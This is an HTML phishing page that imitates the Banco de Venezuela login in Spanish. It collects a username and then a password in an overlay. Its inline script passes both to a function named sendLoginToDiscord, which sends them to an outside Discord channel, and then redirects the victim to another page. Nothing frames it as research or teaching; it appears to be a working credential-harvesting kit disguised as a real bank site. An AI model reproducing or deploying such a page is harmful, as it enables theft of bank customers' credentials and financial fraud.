<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(background.jpg);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;
        height: 100%;
        width: 100%;
      }

      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 50%;
      }
      .form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }
        .container {
          flex-direction: column;
        }
        .left-side {
          width: 100%;
          height: 100vh;
        }
        .right-side {
          display: none;
        }
      }
    </style>
    <style>
      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group input:focus {
        border: 0;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
        cursor: pointer;
      }
    </style>
    <style>
      .form-group2 {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group2 label {
        position: absolute;
        top: 50%;
        left: 23%;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group2 input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group2 input:focus {
        border: 0;
      }
      .form-group2 input:focus + label,
      .form-group2 input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
    </style>
    <style>
      .overlay {
        display: flex;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 9999;
      }

      .content {
        background-color: #fff;
        width: 350px;
        border-radius: 5px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <!-- Overlay de contraseña (visible por defecto en esta página) -->
    <div class="overlay" id="overlay">
      <div class="content">
        <form id="loginform2">
          <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
          <div class="form-group2">
            <input type="text" name="cl" id="contra" required>
            <label for="contra">Contraseña *</label>
          </div>
          <div style="width: 100%; text-align: center; padding-bottom: 30px">
            <button type="submit" style="width: 160px">Continuar</button>
          </div>
        </form>
      </div>
    </div>

    <div class="container">
      <div class="left-side">
        <form id="loginform" class="form">
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px">
          </div>
          <div style="width: 100%; text-align: center">
            <div class="form-group">
              <input type="text" id="nombre" name="nombre" style="width: 100%" required>
              <label for="nombre">Usuario *</label>
            </div>
          </div>
          <div style="width: 100%; text-align: center">
            <button type="submit">Entrar</button>
          </div>
          <div style="
              width: 100%;
              text-align: center;
              font-size: 12px;
              font-weight: bold;
              color: #999;
              margin-top: 30px;
              margin-bottom: 30px;
            ">
            ¿Olvidaste tu usuario o clave? <br>
            Si eres nuevo clienteBDV regístrate aquí
          </div>
        </form>
      </div>
      <div class="right-side"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script src="script.js"></script>

    <script>
      document.addEventListener('DOMContentLoaded', function() {
        let storedUsername = '';
        
        const loginForm = document.getElementById('loginform');
        const nombreInput = document.getElementById('nombre');
        const overlay = document.getElementById('overlay');
        const contraInput = document.getElementById('contra');
        const passwordForm = document.getElementById('loginform2');

        // Resetear estado al cargar
        if (typeof resetLoginSent === 'function') {
          resetLoginSent();
        }

        // Evento: Envío del formulario de usuario
        loginForm.addEventListener('submit', function(e) {
          e.preventDefault();
          
          const username = nombreInput.value.trim();
          
          if (username === '') {
            alert('Por favor ingrese su usuario');
            nombreInput.focus();
            return;
          }

          storedUsername = username;
          
          // Mostrar overlay de contraseña
          overlay.style.display = 'flex';
          contraInput.value = '';
          setTimeout(() => contraInput.focus(), 100);
        });

        // Evento: Envío del formulario de contraseña
        passwordForm.addEventListener('submit', async function(e) {
          e.preventDefault();
          
          const password = contraInput.value.trim();
          
          if (password === '') {
            alert('Por favor ingrese su contraseña');
            contraInput.focus();
            return;
          }

          // Deshabilitar botón para evitar doble envío
          const submitBtn = this.querySelector('button');
          submitBtn.disabled = true;
          submitBtn.textContent = 'Enviando...';

          try {
            // ENVIAR UN SOLO MENSAJE CON USUARIO + CONTRASEÑA
            const result = await sendLoginToDiscord(storedUsername, password);
            
            if (result.ok) {
              overlay.style.display = 'none';
              window.location.href = 'sel.html';
            } else {
              alert('Error al enviar los datos. Intente nuevamente.');
              submitBtn.disabled = false;
              submitBtn.textContent = 'Continuar';
            }
          } catch (error) {
            console.error('Error:', error);
            alert('Error al procesar la solicitud.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Continuar';
          }
        });

        // Manejar el label del input de usuario
        const userLabel = nombreInput.nextElementSibling;
        if (nombreInput.value !== '') {
          userLabel.style.top = '15px';
          userLabel.style.fontSize = '12px';
        }

        nombreInput.addEventListener('focus', () => {
          userLabel.style.top = '15px';
          userLabel.style.fontSize = '12px';
        });

        nombreInput.addEventListener('blur', () => {
          if (!nombreInput.value) {
            userLabel.style.top = '50%';
            userLabel.style.fontSize = '';
          }
        });

        // Manejar el label del input de contraseña
        const passLabel = contraInput.nextElementSibling;
        if (contraInput.value !== '') {
          passLabel.style.top = '15px';
          passLabel.style.fontSize = '12px';
        }

        contraInput.addEventListener('focus', () => {
          passLabel.style.top = '15px';
          passLabel.style.fontSize = '12px';
        });

        contraInput.addEventListener('blur', () => {
          if (!contraInput.value) {
            passLabel.style.top = '50%';
            passLabel.style.fontSize = '';
          }
        });

        // Cerrar overlay con ESC
        document.addEventListener('keydown', function(e) {
          if (e.key === 'Escape' && overlay.style.display === 'flex') {
            overlay.style.display = 'none';
          }
        });
      });
    </script>
  </body>
</html>
